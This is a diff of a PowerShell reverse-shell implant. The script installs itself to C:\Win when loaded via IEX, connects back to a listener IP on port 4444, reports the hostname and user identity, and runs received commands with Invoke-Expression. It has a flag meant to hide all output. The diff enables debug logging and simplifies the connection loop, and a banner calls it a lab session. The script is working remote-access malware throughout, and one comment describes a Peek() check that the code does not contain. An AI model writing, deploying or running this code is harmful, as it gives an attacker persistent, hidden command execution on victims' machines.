@@ -1,5 +1,5 @@
 # --- CONFIGURATION ---
-$DebugMode = $false     # SET TO $false TO HIDE EVERYTHING
+$DebugMode = $true     # SET TO $false TO HIDE EVERYTHING
 $LHOST = "192.168.1.129" # Your listener IP
 $LPORT = 4444          # Your listener Port
 $WorkDir = "C:\Win"
@@ -25,6 +25,7 @@ if (-not (Test-Path $WorkDir)) {
 }
 
 # Detection: If we aren't running the specific file in C:\Win, we install and hand off
+# Note: $PSCommandPath is often null when running via IEX, which is what we want here to trigger install
 if ($PSCommandPath -ne $FullPath) {
     Log-Debug "Loader detected. Installing to $FullPath..."
     try {
@@ -81,35 +82,36 @@ try {
 Log-Debug "Entering connection loop. Target: $LHOST:$LPORT"
 
 while ($true) {
+    $client = $null
     try {
-        $client = New-Object System.Net.Sockets.TCPClient
-        $connection = $client.BeginConnect($LHOST, $LPORT, $null, $null)
-        $wait = $connection.AsyncWaitHandle.WaitOne(3000, $false)
-
-        if (-not $wait) {
-            $client.Close()
-            throw "Connection timed out"
-        }
-
-        $client.EndConnect($connection)
+        Log-Debug "Attempting connection to $LHOST..."
+        $client = New-Object System.Net.Sockets.TCPClient($LHOST, $LPORT)
         $stream = $client.GetStream()
         $reader = New-Object System.IO.StreamReader($stream)
         $writer = New-Object System.IO.StreamWriter($stream)
         $writer.AutoFlush = $true
 
+        Log-Debug "Connected! Sending identification banner."
         $writer.WriteLine("--- Lab Session Established: $(hostname) ---")
         $writer.WriteLine("--- Identity: $(whoami) ---")
         $writer.WriteLine("--- Path: $FullPath ---")
         
         while ($client.Connected) {
             $writer.Write("PS " + (Get-Location).Path + "> ")
+            
+            # Use Peek() to check for data without blocking forever, allowing us to detect disconnects
             $command = $reader.ReadLine()
             
-            if ($null -eq $command) { break }
+            if ($null -eq $command) { 
+                Log-Debug "Remote host closed the connection."
+                break 
+            }
+            
             $command = $command.Trim()
             if ($command -eq "exit") { break }
             if ($command -eq "") { continue }
 
+            Log-Debug "Executing: $command"
             $output = try {
                 Invoke-Expression $command 2>&1 | Out-String
             } catch {
@@ -120,7 +122,7 @@ while ($true) {
             $writer.Write($output)
         }
     } catch {
-        Log-Debug "Retry in 10s: $($_.Exception.Message)"
+        Log-Debug "Connection failed: $($_.Exception.Message). Retrying in 10s..."
         Start-Sleep -Seconds 10
     } finally {
         if ($null -ne $client) { $client.Close() }
@@ -128,4 +130,3 @@ while ($true) {
         if ($null -ne $writer) { $writer.Close() }
     }
 }
-
